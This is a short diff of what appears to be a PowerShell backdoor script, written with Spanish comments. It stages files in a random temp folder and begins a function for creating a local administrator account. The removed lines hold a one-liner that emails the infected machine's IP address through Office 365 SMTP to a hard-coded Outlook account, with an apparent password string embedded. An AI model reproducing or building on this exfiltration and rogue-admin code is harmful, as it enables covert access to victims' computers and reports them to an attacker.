@@ -10,10 +10,6 @@ function random_text {
 $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = $PWD.Path
- 
-
-#enviando ip por smtp
-#powershell $EmailFrom = "processdata123@outlook.es";$EmailTo = "processdata123@outlook.es";$Subject = "Nueva conexión:";$SMTPServer = "smtp.office365.com";$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress;$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPClient.EnableSsl = $true;$message = New-Object System.Net.Mail.MailMessage $EmailFrom, $EmailTo;$message.Subject = $Subject;$message.IsBodyHTML = $true;$message.Body = "$ip";$pass = Read-Host "ProcesandoDatos123$!" -AsSecureString; $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom, $pass); $SMTPClient.Send($message)
 
 #Creando administrador local
 function Create-NewLocalAdmin {
